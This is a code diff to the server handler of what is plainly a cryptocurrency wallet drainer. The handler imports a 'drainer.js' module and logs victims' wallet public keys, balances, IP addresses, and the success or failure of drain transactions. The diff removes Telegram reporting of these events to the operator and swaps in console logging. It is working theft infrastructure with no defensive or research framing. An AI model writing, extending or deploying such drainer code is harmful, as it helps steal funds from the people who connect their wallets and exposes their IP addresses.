@@ -1,5 +1,4 @@
 import drainerHandler from './drainer.js';
-import telegramLogger from '../src/telegram.js';
 
 export default async function handler(req, res) {
   // Set CORS headers for Vercel deployment
@@ -51,12 +50,12 @@ async function handleWalletLogging(req, res) {
       ip: userIp
     });
     
-    // Log wallet detection
-    await telegramLogger.logWalletDetected({
+    // Simple logging without telegram for now
+    console.log('[WALLET_LOG] Wallet detected:', {
       publicKey: publicKey,
+      walletType: walletType || 'Unknown',
       lamports: lamports || 0,
-      ip: userIp,
-      walletType: walletType || 'Unknown'
+      ip: userIp
     });
     
     console.log('[SERVER] Wallet logging successful');
@@ -76,18 +75,19 @@ async function handleConfirmationLogging(req, res) {
     
     if (status === 'confirmed' || status === 'finalized' || status === 'processed' || status === 'broadcast_success') {
       console.log('[CONFIRMATION] Logging successful confirmation for:', publicKey, txid, 'status:', status);
-      await telegramLogger.logDrainSuccess({
+      console.log('[DRAIN_SUCCESS] Transaction successful:', {
         publicKey: publicKey,
-        actualDrainAmount: 0,
+        txid: txid,
+        status: status,
         ip: userIp
       });
     } else if (error) {
       console.log('[CONFIRMATION] Logging failed confirmation for:', publicKey, txid, error);
-      await telegramLogger.logDrainFailed({
+      console.log('[DRAIN_FAILED] Transaction failed:', {
         publicKey: publicKey,
-        lamports: 0,
-        ip: userIp,
-        error: error || 'Transaction failed on-chain'
+        txid: txid,
+        error: error,
+        ip: userIp
       });
     } else {
       console.log('[CONFIRMATION] Unknown status:', status, 'for:', publicKey, txid);
@@ -108,7 +108,7 @@ async function handleCancellationLogging(req, res) {
     const { publicKey, walletType, reason } = req.body;
     const userIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown';
     
-    await telegramLogger.logTransactionCancelled({
+    console.log('[CANCELLATION] Transaction cancelled:', {
       publicKey: publicKey,
       walletType: walletType || 'Unknown',
       reason: reason || 'User cancelled transaction',
